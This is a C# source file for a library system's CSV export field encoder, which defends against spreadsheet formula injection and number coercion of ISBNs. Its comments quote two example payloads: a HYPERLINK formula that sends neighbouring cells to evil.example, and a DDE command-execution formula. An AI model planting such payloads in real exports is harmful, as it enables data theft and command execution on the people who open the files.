namespace Library.Application.Reports.Export;

/// <summary>
/// Encodes a single value for safe inclusion in a CSV file.
/// </summary>
/// <remarks>
/// <para>
/// Two separate jobs, and conflating them is how CSV exports go wrong:
/// </para>
/// <list type="number">
///   <item><b>Quoting</b>, so a value containing a comma, quote or newline does
///     not break the file's structure. Every CSV library does this.</item>
///   <item><b>Formula-injection defence</b>, so a value does not execute when the
///     file is opened in a spreadsheet. Most CSV libraries do <i>not</i> do this,
///     because it is not a CSV concern — it is a concern about what Excel does
///     with a CSV.</item>
///   <item><b>Type preservation</b>, so an identifier made of digits is not
///     re-read as a number. Also not a CSV concern, and also a real defect when
///     it is missing.</item>
/// </list>
/// <para>
/// The second is the one that matters most, and it is a real vulnerability
/// rather than a theoretical one. All three share a mechanism: a leading
/// apostrophe, which is how a spreadsheet is told "this cell is text".
/// </para>
/// </remarks>
public interface ICsvFieldEncoder
{
    /// <summary>
    /// Encodes one field: forces text where required, neutralises formulas, then
    /// quotes if needed.
    /// </summary>
    string Encode(ExportValue value);
}

/// <summary>
/// Default encoder: neutralises spreadsheet formulas, then applies RFC 4180 quoting.
/// </summary>
/// <remarks>
/// <para>
/// <b>The attack this prevents (CSV / formula injection, CWE-1236).</b> Excel,
/// LibreOffice Calc and Google Sheets treat a cell beginning with <c>=</c>,
/// <c>+</c>, <c>-</c> or <c>@</c> as a formula, not text. So a book title
/// catalogued as:
/// </para>
/// <code>
/// =HYPERLINK("https://evil.example/?d="&amp;A1&amp;A2&amp;A3,"Click for details")
/// </code>
/// <para>
/// becomes a working link in the librarian's spreadsheet that exfiltrates
/// neighbouring cells when clicked. Worse variants exist: <c>=cmd|'/c calc'!A0</c>
/// invokes DDE, which older Excel configurations will execute after a prompt most
/// users click through.
/// </para>
/// <para>
/// <b>Why the API being safe is not enough.</b> Nothing here is an injection
/// against <i>this</i> system — the value is stored and returned faithfully, and
/// every query is parameterised. The vulnerability is in the export: this
/// application writes a file that another application executes. A server that
/// only defends its own process hands the attack to the person who opens the
/// download.
/// </para>
/// <para>
/// <b>The fix and its cost.</b> A leading <c>'</c> forces the spreadsheet to
/// treat the cell as text. The cost is visible: a legitimate title that genuinely
/// starts with <c>-</c> or <c>+</c> shows a stray apostrophe in Excel. That is
/// the accepted trade — a cosmetic blemish on rare rows against arbitrary formula
/// execution on the rest.
/// </para>
/// </remarks>
public sealed class CsvFieldEncoder : ICsvFieldEncoder
{
    /// <summary>
    /// Characters that begin a formula in every major spreadsheet.
    /// </summary>
    /// <remarks>
    /// <c>=</c> and <c>+</c> start a formula outright. <c>-</c> does too, because
    /// <c>-1+1</c> is arithmetic. <c>@</c> is Lotus-era syntax that Excel still
    /// honours, and it is the one most commonly missed.
    /// </remarks>
    private static readonly char[] FormulaTriggers = ['=', '+', '-', '@'];

    /// <summary>
    /// Control characters that also trigger formula interpretation.
    /// </summary>
    /// <remarks>
    /// Tab and carriage return at the start of a cell are stripped by some
    /// spreadsheet parsers <i>before</i> the formula check, so <c>"\t=1+1"</c>
    /// evaluates. Prefixing on these too closes that bypass.
    /// </remarks>
    private static readonly char[] LeadingControlTriggers = ['\t', '\r'];

    public string Encode(ExportValue value)
    {
        string? raw = value.Value;

        if (string.IsNullOrEmpty(raw))
        {
            return string.Empty;
        }

        string safe = value.IsText ? ForceText(raw) : NeutraliseFormula(raw);

        return NeedsQuoting(safe) ? Quote(safe) : safe;
    }

    /// <summary>
    /// Keeps a declared-text column readable as text.
    /// </summary>
    /// <remarks>
    /// <para>
    /// <b>The defect this fixes.</b> A CSV carries no types, so Excel infers one
    /// per cell. An all-digit value is inferred as a number, and a 13-digit ISBN
    /// exceeds the width Excel will show in full, so <c>9780132350884</c> is
    /// displayed as <c>9.78E+12</c>. The digits are still in the file — every
    /// script that parses it gets the right answer — but the person who opened
    /// the download cannot read the ISBN, which is the entire purpose of the
    /// column. Leading zeros are lost the same way, silently and permanently once
    /// the sheet is saved back.
    /// </para>
    /// <para>
    /// <b>Why quoting is not the fix.</b> <c>"9780132350884"</c> is converted
    /// too. RFC 4180 quotes describe the file's structure, not the cell's type,
    /// and Excel discards them before inferring. The apostrophe is the only
    /// in-band signal a spreadsheet honours — the same mechanism as the formula
    /// defence, applied for a different reason.
    /// </para>
    /// <para>
    /// <b>Why only all-digit values.</b> A barcode reads <c>LIB-001000</c> and a
    /// membership number <c>MEM-2026-00042</c>; neither is a candidate for number
    /// conversion, so prefixing them would add a visible apostrophe and fix
    /// nothing. The columns are still declared as text, because that is a fact
    /// about the column rather than about today's format — the day barcodes
    /// become purely numeric, this handles them without a code change.
    /// </para>
    /// <para>
    /// A text column that happens to start with a formula trigger still needs
    /// disarming, so that check is not skipped.
    /// </para>
    /// </remarks>
    private static string ForceText(string value) =>
        IsAllDigits(value) ? "'" + value : NeutraliseFormula(value);

    /// <summary>True when every character is an ASCII digit.</summary>
    /// <remarks>
    /// Deliberately narrower than "parses as a number". <c>1e5</c> and
    /// <c>Infinity</c> parse, and an identifier column containing either is a
    /// data problem rather than a formatting one. Digits are the case that
    /// actually occurs and the case Excel actually converts.
    /// </remarks>
    private static bool IsAllDigits(string value)
    {
        foreach (char c in value)
        {
            if (!char.IsAsciiDigit(c))
            {
                return false;
            }
        }

        return true;
    }

    /// <summary>
    /// Prefixes a leading formula trigger with an apostrophe.
    /// </summary>
    /// <remarks>
    /// Checked on the raw value before quoting, because quoting does not help:
    /// Excel strips the surrounding quotes and then evaluates what is inside.
    /// <c>"=1+1"</c> is still a formula.
    /// </remarks>
    private static string NeutraliseFormula(string value)
    {
        char first = value[0];

        bool isTrigger =
            Array.IndexOf(FormulaTriggers, first) >= 0 ||
            Array.IndexOf(LeadingControlTriggers, first) >= 0;

        return isTrigger ? "'" + value : value;
    }

    /// <summary>RFC 4180: quote when the field contains a delimiter, quote or newline.</summary>
    private static bool NeedsQuoting(string value) =>
        value.Contains(',', StringComparison.Ordinal) ||
        value.Contains('"', StringComparison.Ordinal) ||
        value.Contains('\n', StringComparison.Ordinal) ||
        value.Contains('\r', StringComparison.Ordinal);

    /// <summary>Wraps in quotes, doubling any quote inside — RFC 4180's escape.</summary>
    private static string Quote(string value) =>
        $"\"{value.Replace("\"", "\"\"", StringComparison.Ordinal)}\"";
}
